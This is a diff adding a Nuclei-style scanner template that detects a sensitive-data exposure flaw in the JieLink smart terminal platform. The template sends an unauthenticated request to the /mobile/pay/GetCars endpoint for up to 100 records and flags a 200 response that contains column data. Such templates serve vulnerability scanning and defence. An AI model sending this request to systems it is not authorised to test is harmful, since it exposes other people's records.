@@ -1,0 +1,28 @@
+id: JieLink-Information-disclosure
+
+info:
+  name: JieLink智能终端操作平台敏感数据暴露漏洞
+  author: Unknown
+  severity: medium
+  description: JieLink智能终端操作平台存在敏感数据暴露漏洞，攻击者可通过该漏洞获取系统内的敏感信息，可能导致数据泄露和进一步的安全风险。
+  tags: JieLink智能终端操作平台
+
+http:
+- raw:
+  - |
+    GET /mobile/pay/GetCars?pageIndex=1&pageSize=100 HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - '"columns":'
+  - type: status
+    status:
+    - 200
+
+
+
+
+
